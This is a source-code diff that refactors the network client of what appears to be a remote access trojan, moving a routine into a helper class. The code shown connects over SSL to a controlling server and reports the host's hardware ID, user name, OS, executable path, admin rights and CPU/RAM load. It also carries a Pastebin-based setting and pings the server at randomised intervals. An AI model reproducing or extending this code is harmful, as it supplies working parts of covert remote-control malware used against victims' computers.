@@ -32,8 +32,6 @@ namespace Client.Sockets
         private static MemoryStream MS { get; set; }
         public static bool IsConnected { get; set; }
         private static object SendSync { get; } = new object();
-        private static PerformanceCounter TheCPUCounter { get; } = new PerformanceCounter("Processor", "% Processor Time", "_Total");
-        private static PerformanceCounter TheMemCounter { get; } = new PerformanceCounter("Memory", "% Committed Bytes In Use");
 
         public static void InitializeClient()
         {
@@ -70,7 +68,7 @@ namespace Client.Sockets
                     SslClient.AuthenticateAsClient(Client.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
                     Buffer = new byte[4];
                     MS = new MemoryStream();
-                    Send(SendInfo());
+                    Send(Methods.SendInfo());
                     Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
                     SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
                 }
@@ -104,23 +102,6 @@ namespace Client.Sockets
             {
                 InitializeClient();
             }
-        }
-
-        public static byte[] SendInfo()
-        {
-            MsgPack msgpack = new MsgPack();
-            msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
-            msgpack.ForcePathObject("HWID").AsString = Methods.HWID();
-            msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
-            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " +
-                Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
-            msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
-            msgpack.ForcePathObject("Version").AsString = Settings.Version;
-            msgpack.ForcePathObject("Admin").AsString = Methods.IsAdmin().ToString().ToLower().Replace("true", "Administrator").Replace("false", "User");
-            TheCPUCounter.NextValue();
-            msgpack.ForcePathObject("Performance").AsString = $"CPU {(int)TheCPUCounter.NextValue()}%   RAM {(int)TheMemCounter.NextValue()}%";
-            msgpack.ForcePathObject("Pastebin").AsString = Settings.Pastebin;
-            return msgpack.Encode2Bytes();
         }
 
         public static void ReadServertData(IAsyncResult ar)
@@ -213,7 +194,7 @@ namespace Client.Sockets
         {
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "Ping";
-            msgpack.ForcePathObject("Message").AsString = $"CPU {(int)TheCPUCounter.NextValue()}%   RAM {(int)TheMemCounter.NextValue()}%";
+            msgpack.ForcePathObject("Message").AsString = $"CPU {(int)Methods.TheCPUCounter.NextValue()}%   RAM {(int)Methods.TheMemCounter.NextValue()}%";
             Send(msgpack.Encode2Bytes());
         }
 
